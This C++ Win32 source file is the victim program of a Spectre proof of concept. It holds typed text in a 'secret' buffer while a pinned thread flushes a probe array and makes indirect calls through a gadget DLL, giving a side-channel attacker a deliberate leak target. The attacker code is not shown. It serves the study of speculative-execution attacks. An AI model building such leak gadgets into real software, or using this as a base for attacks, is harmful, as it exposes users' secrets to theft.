#include <windows.h>
#include <windowsx.h>
#include <intrin.h>
#include <cstdint>
#include <memory>
#include "basewindow.h"

extern "C" {
  void LoadGadget();
  void IndirectCall(const void *proc,
                    const void *target_memory,
                    const void *probe_start);
}

uint8_t secret[4096];
constexpr int probe_lines = 256;
uint8_t *probe = nullptr;

auto gadget_module = GetModuleHandle(L"gadget.dll");
void (*Touch)(uint8_t*, uint8_t*) = nullptr;
void do_nothing(uint8_t*, uint8_t*) {}

DWORD WINAPI victim_thread(LPVOID target) {
  SetThreadAffinityMask(GetCurrentThread(), 2);

  void (*target_proc)(uint8_t*, uint8_t*) = do_nothing;
  void *call_destination = reinterpret_cast<void*>(&target_proc);

  for (;;) {
    for (int trial = 0; trial < 20000; ++trial) {
      Sleep(20);
      // This is strange.  For some reason, flushing the probe on the victim side
      // helps getting repro.  Need to find a way to get rid of this hack later.
      for (int i = 0; i < probe_lines; ++i)
        _mm_clflush(&probe[i * 4096]);

      IndirectCall(call_destination, target, probe);
    }
  }
}

class MainWindow : public BaseWindow<MainWindow> {
private:
  enum CTRL_ID : uint32_t {
    EDIT = 0x100,
    BUTTON_EVICT,
    BUTTON_FLUSH,
    BUTTON_TOUCH,
    BUTTON_SPECULATIVE,
  };
  static constexpr uint32_t CTRL_HEIGHT = 20;

  HWND edit_;

  bool InitWindow() {
    if (!edit_) {
      RECT client;
      GetClientRect(hwnd(), &client);
      edit_ = CreateWindow(L"Edit",
                           L"",
                           WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
                           0, 0, client.right - client.left, CTRL_HEIGHT,
                           hwnd(),
                           /*hMenu*/reinterpret_cast<HMENU>(EDIT),
                           GetModuleHandle(nullptr),
                           /*lpParam*/nullptr);
    }
    return edit_;
  }

  void Resize() {
    RECT client;
    GetClientRect(hwnd(), &client);
    MoveWindow(edit_,
               0, 0, client.right - client.left, CTRL_HEIGHT,
               /*bRepaint*/TRUE);
  }

public:
  LPCWSTR ClassName() const {
    return L"MainWindow";
  }

  MainWindow()
    : edit_(nullptr)
  {}

  LRESULT HandleMessage(UINT msg, WPARAM w, LPARAM l) {
    LRESULT ret = 0;
    switch (msg) {
    case WM_CREATE:
      if (!InitWindow()) return -1;
      break;
    case WM_SIZE:
      Resize();
      break;
    case WM_DESTROY:
      PostQuitMessage(0);
      break;
    case WM_COMMAND:
      switch(LOWORD(w)) {
      case EDIT:
        if (HIWORD(w) == EN_CHANGE) {
          Edit_GetText(edit_,
                       reinterpret_cast<LPWSTR>(secret),
                       sizeof(secret));
        }
        break;
      }
      break;
    default:
      ret = DefWindowProc(hwnd(), msg, w, l);
      break;
    }
    return ret;
  }
};

int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int) {
  LoadGadget();
  auto section = FindResource(gadget_module, L"DATA", RT_BITMAP);
  probe = reinterpret_cast<uint8_t*>(reinterpret_cast<DWORD_PTR>(section) & ~0xfff);
  Touch = reinterpret_cast<void(*)(uint8_t*, uint8_t*)>(GetProcAddress(gadget_module, "Touch"));

  DWORD tid;
  HANDLE h = CreateThread(/*lpThreadAttributes*/nullptr,
               /*dwStackSize*/0,
               victim_thread,
               /*lpParameter*/secret,
               0,
               &tid);
  //WaitForSingleObject(h, INFINITE);

  if (auto p = std::make_unique<MainWindow>()) {
    if (p->Create(L"Victim of Spectre attack",
                  WS_OVERLAPPEDWINDOW,
                  /*style_ex*/0,
                  CW_USEDEFAULT, 0,
                  486, 300)) {
      ShowWindow(p->hwnd(), SW_SHOW);
      MSG msg{};
      while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
      }
    }
  }

  return 0;
}
